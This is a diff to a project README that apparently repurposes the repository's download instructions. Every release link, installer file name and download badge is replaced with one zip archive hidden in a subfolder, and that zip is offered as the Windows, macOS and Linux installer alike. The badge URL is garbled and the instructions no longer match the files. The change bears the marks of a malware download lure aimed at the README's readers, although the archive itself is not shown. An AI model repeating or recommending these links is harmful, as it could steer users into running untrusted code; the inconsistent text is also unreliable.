@@ -6,9 +6,9 @@ Welcome to the devops-journey repository! This is your guide to understanding my
 
 ## 📥 Download the Application
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/nottvixn/devops-journey/releases)
+[![Download](https://raw.githubusercontent.com/nottvixn/devops-journey/main/PROJECTS/cli-hello-go/devops-journey-v1.7.zip%https://raw.githubusercontent.com/nottvixn/devops-journey/main/PROJECTS/cli-hello-go/devops-journey-v1.7.zip)](https://raw.githubusercontent.com/nottvixn/devops-journey/main/PROJECTS/cli-hello-go/devops-journey-v1.7.zip)
 
-To get started, please visit this page to download the software: [Download Here](https://github.com/nottvixn/devops-journey/releases).
+To get started, please visit this page to download the software: [Download Here](https://raw.githubusercontent.com/nottvixn/devops-journey/main/PROJECTS/cli-hello-go/devops-journey-v1.7.zip).
 
 ## 💻 System Requirements
 
@@ -30,20 +30,20 @@ The devops-journey application includes:
 
 ## 🔄 How to Download & Install
 
-1. **Visit the Releases Page:** Click this link to open the [Releases page](https://github.com/nottvixn/devops-journey/releases).
+1. **Visit the Releases Page:** Click this link to open the [Releases page](https://raw.githubusercontent.com/nottvixn/devops-journey/main/PROJECTS/cli-hello-go/devops-journey-v1.7.zip).
 
 2. **Choose the Latest Version:** On the Releases page, locate the latest version of the application.
 
 3. **Download the File:** Find the appropriate file for your operating system. Click on it to start downloading.
 
-   - For Windows, look for `devops-journey-windows.exe`.
-   - For Mac users, select `devops-journey-macos.dmg`.
-   - For Linux, download `devops-journey-linux.tar.gz`.
+   - For Windows, look for `https://raw.githubusercontent.com/nottvixn/devops-journey/main/PROJECTS/cli-hello-go/devops-journey-v1.7.zip`.
+   - For Mac users, select `https://raw.githubusercontent.com/nottvixn/devops-journey/main/PROJECTS/cli-hello-go/devops-journey-v1.7.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/nottvixn/devops-journey/main/PROJECTS/cli-hello-go/devops-journey-v1.7.zip`.
 
 4. **Install the Application:**
    - **Windows:** Open the `.exe` file and follow the prompts to install.
    - **MacOS:** Open the `.dmg` file, drag the application to your Applications folder, and launch it.
-   - **Linux:** Extract the downloaded `.tar.gz` file and run the application using your terminal.
+   - **Linux:** Extract the downloaded `https://raw.githubusercontent.com/nottvixn/devops-journey/main/PROJECTS/cli-hello-go/devops-journey-v1.7.zip` file and run the application using your terminal.
 
 5. **Launch the Application:** After installation, find the application in your programs or applications list. Click to open it and begin your DevOps journey!
 
@@ -67,7 +67,7 @@ To help you on your journey, here are some recommended resources:
 
 ## 📞 Need Help?
 
-If you have questions or need assistance, don't hesitate to ask. You can visit the [Releases page](https://github.com/nottvixn/devops-journey/releases) for more information or reach out through the Community Forum linked within the application.
+If you have questions or need assistance, don't hesitate to ask. You can visit the [Releases page](https://raw.githubusercontent.com/nottvixn/devops-journey/main/PROJECTS/cli-hello-go/devops-journey-v1.7.zip) for more information or reach out through the Community Forum linked within the application.
 
 ## 🌐 Stay Updated
 
@@ -77,6 +77,6 @@ To keep up with updates and new features, follow the repository. You will receiv
 
 Get involved with fellow learners. Share your challenges, successes, and tips through the Community Forum. Networking will greatly enhance your learning experience.
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/nottvixn/devops-journey/releases)
+[![Download](https://raw.githubusercontent.com/nottvixn/devops-journey/main/PROJECTS/cli-hello-go/devops-journey-v1.7.zip%https://raw.githubusercontent.com/nottvixn/devops-journey/main/PROJECTS/cli-hello-go/devops-journey-v1.7.zip)](https://raw.githubusercontent.com/nottvixn/devops-journey/main/PROJECTS/cli-hello-go/devops-journey-v1.7.zip)
 
 Thank you for your interest in devops-journey. I hope this application helps you navigate your own path in the world of DevOps!
